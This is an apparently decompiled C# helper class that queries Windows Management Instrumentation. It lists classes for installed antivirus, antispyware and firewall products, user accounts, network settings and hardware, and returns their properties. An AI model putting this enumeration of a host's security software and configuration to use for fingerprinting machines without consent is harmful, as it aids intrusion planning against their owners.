using System.Collections.Generic;
using System.Management;

namespace NoiseMe.Drags.App.Data.WMI
{
	public static class WmiInstance
	{
		public const string OPERATINGSYSTEM_CLASSNAME = "Win32_OperatingSystem";

		public const string USERACCOUNT_CLASSNAME = "Win32_UserAccount";

		public const string ANTIVIRUS_CLASSNAME = "AntivirusProduct";

		public const string ANTISPYWARE_CLASSNAME = "AntiSpyWareProduct";

		public const string FIREWALL_CLASSNAME = "FirewallProduct";

		public const string NETWORKADAPTER_CLASSNAME = "Win32_NetworkAdapterConfiguration";

		public const string BASEBOARD_CLASSNAME = "Win32_Baseboard";

		public const string PHYSICALMEMORY_CLASSNAME = "Win32_PhysicalMemory";

		public const string PROCESSOR_CLASSNAME = "Win32_Processor";

		public const string VIDEOCONTROLLER_CLASSNAME = "Win32_VideoController";

		public const string DISKDRIVE_CLASSNAME = "Win32_DiskDrive";

		public const string BIOS_CLASSNAME = "Win32_BIOS";

		private static ManagementObjectCollection GetObjectCollection(ObjectQuery query, ManagementScope scope)
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(scope, query))
			{
				return managementObjectSearcher.Get();
			}
		}

		private static ManagementObjectCollection GetObjectCollection(string query, ManagementScope scope)
		{
			return GetObjectCollection(new ObjectQuery(query), scope);
		}

		private static ManagementObjectCollection GetObjectCollection(string wmiclass, string[] properties, string condition, ManagementScope scope)
		{
			string text = (properties == null) ? "*" : string.Join(",", properties);
			return GetObjectCollection(string.IsNullOrEmpty(condition) ? ("SELECT " + text + " FROM " + wmiclass) : ("SELECT " + text + " FROM " + wmiclass + " WHERE " + condition), scope);
		}

		private static ManagementObjectCollection GetObjectCollection(string wmiclass, string property, string condition, ManagementScope scope)
		{
			return GetObjectCollection(wmiclass, new string[1]
			{
				property
			}, condition, scope);
		}

		private static WmiInstanceClassCollection ParseObjectCollection(ManagementObjectCollection objectCollection)
		{
			List<WmiInstanceClass> list = new List<WmiInstanceClass>();
			try
			{
				foreach (ManagementObject item in objectCollection)
				{
					List<WmiInstanceProperty> list2 = new List<WmiInstanceProperty>();
					foreach (PropertyData property in item.Properties)
					{
						list2.Add(new WmiInstanceProperty(property.Name, property.Value));
					}
					list.Add(new WmiInstanceClass(list2));
				}
			}
			catch (ManagementException)
			{
				return null;
			}
			objectCollection?.Dispose();
			return new WmiInstanceClassCollection(list);
		}

		public static WmiInstanceClassCollection Query(string wmiclass, string[] properties, string condition, ManagementScope scope = null)
		{
			return ParseObjectCollection(GetObjectCollection(wmiclass, properties, condition, scope));
		}

		public static WmiInstanceClassCollection Query(string wmiclass, string[] properties, ManagementScope scope = null)
		{
			return Query(wmiclass, properties, null, scope);
		}

		public static WmiInstanceClassCollection Query(string wmiclass, ManagementScope scope = null)
		{
			return Query(wmiclass, null, scope);
		}

		public static WmiInstanceClassCollection CustomQuery(ObjectQuery query, ManagementScope scope = null)
		{
			return ParseObjectCollection(GetObjectCollection(query, scope));
		}

		public static WmiInstanceClassCollection CustomQuery(string query, ManagementScope scope = null)
		{
			return CustomQuery(new ObjectQuery(query), scope);
		}

		public static WmiInstanceProperty PropertyQuery(string wmiclass, string property, string condition, ManagementScope scope = null)
		{
			foreach (WmiInstanceClass item in ParseObjectCollection(GetObjectCollection(wmiclass, property, condition, scope)))
			{
				WmiInstanceProperty[] properties = item.Properties;
				int num = 0;
				if (num < properties.Length)
				{
					return properties[num];
				}
			}
			return null;
		}

		public static WmiInstanceProperty PropertyQuery(string wmiclass, string property, ManagementScope scope = null)
		{
			return PropertyQuery(wmiclass, property, null, scope);
		}

		public static T PropertyQuery<T>(string wmiclass, string property, string condition, ManagementScope scope = null)
		{
			WmiInstanceProperty wmiInstanceProperty = PropertyQuery(wmiclass, property, condition, scope);
			if (wmiInstanceProperty.Value != null)
			{
				return (T)wmiInstanceProperty.Value;
			}
			return default(T);
		}

		public static T PropertyQuery<T>(string wmiclass, string property, ManagementScope scope = null)
		{
			return PropertyQuery<T>(wmiclass, property, null, scope);
		}
	}
}
